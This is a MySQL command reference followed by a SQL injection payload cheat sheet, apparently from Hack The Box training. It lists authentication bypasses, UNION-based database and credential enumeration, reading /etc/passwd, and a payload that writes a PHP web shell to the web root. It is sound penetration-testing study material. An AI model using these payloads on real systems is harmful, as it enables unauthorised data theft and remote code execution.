# MySQL Cheat Sheet

## General Commands

|**Command**|**Description**|
|---|---|
|`mysql -u root -h docker.hackthebox.eu -P 3306 -p`|Login to MySQL database|
|`SHOW DATABASES`|List available databases|
|`USE users`|Switch to a database|

---

## Table Commands

|**Command**|**Description**|
|---|---|
|`CREATE TABLE logins (id INT, ...)`|Add a new table|
|`SHOW TABLES`|List tables in the current database|
|`DESCRIBE logins`|Show table properties and columns|
|`INSERT INTO table_name VALUES (value_1, ...)`|Add values to a table|
|`INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`|Add values to specific columns|
|`UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`|Update table values|

---

## Column Commands

|**Command**|**Description**|
|---|---|
|`SELECT * FROM table_name`|Show all columns in a table|
|`SELECT column1, column2 FROM table_name`|Show specific columns in a table|
|`DROP TABLE logins`|Delete a table|
|`ALTER TABLE logins ADD newColumn INT`|Add a new column|
|`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`|Rename a column|
|`ALTER TABLE logins MODIFY oldColumn DATE`|Change column datatype|
|`ALTER TABLE logins DROP oldColumn`|Delete a column|

---

## Output Commands

|**Command**|**Description**|
|---|---|
|`SELECT * FROM logins ORDER BY column_1`|Sort results by column|
|`SELECT * FROM logins ORDER BY column_1 DESC`|Sort results in descending order|
|`SELECT * FROM logins ORDER BY column_1 DESC, id ASC`|Sort by multiple columns|
|`SELECT * FROM logins LIMIT 2`|Show the first two results|
|`SELECT * FROM logins LIMIT 1, 2`|Show two results starting at index 2|
|`SELECT * FROM table_name WHERE <condition>`|List results meeting a condition|
|`SELECT * FROM logins WHERE username LIKE 'admin%'`|Find rows where the name matches pattern|

---

## MySQL Operator Precedence

1. **Division** (`/`), **Multiplication** (`*`), **Modulus** (`%`)
2. **Addition** (`+`) and **Subtraction** (`-`)
3. **Comparison** (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. **NOT** (`!`)
5. **AND** (`&&`)
6. **OR** (`||`)

---

## SQL Injection Payloads

### Authentication Bypass

|**Payload**|**Description**|
|---|---|
|`admin' or '1'='1`|Basic auth bypass|
|`admin')-- -`|Auth bypass with comments|

### Union Injection

|**Payload**|**Description**|
|---|---|
|`' order by 1-- -`|Detect the number of columns|
|`cn' UNION select 1,2,3-- -`|Test columns via union injection|
|`cn' UNION select 1,@@version,3,4-- -`|Test union injection with MySQL version|
|`UNION select username, 2, 3, 4 from passwords-- -`|Union injection for data retrieval|

---

### Database Enumeration

|**Payload**|**Description**|
|---|---|
|`SELECT @@version`|Fingerprint MySQL with query output|
|`SELECT SLEEP(5)`|Fingerprint MySQL with no output|
|`cn' UNION select 1,database(),2,3-- -`|Current database name|
|`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`|List all databases|
|`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`|List tables in a specific database|
|`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`|List columns in a specific table|
|`cn' UNION select 1, username, password, 4 from dev.credentials-- -`|Dump data from another database|

---

### Privileges

|**Payload**|**Description**|
|---|---|
|`cn' UNION SELECT 1, user(), 3, 4-- -`|Find the current user|
|`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`|Check if user has admin privileges|
|`cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`|List user privileges|
|`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`|Check accessible directories|

---

### File Injection

| **Payload**                                                                                               | **Description**                             |
| --------------------------------------------------------------------------------------------------------- | ------------------------------------------- |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                  | Read a local file                           |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                              | Write a string to a local file              |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a PHP web shell to the base directory |
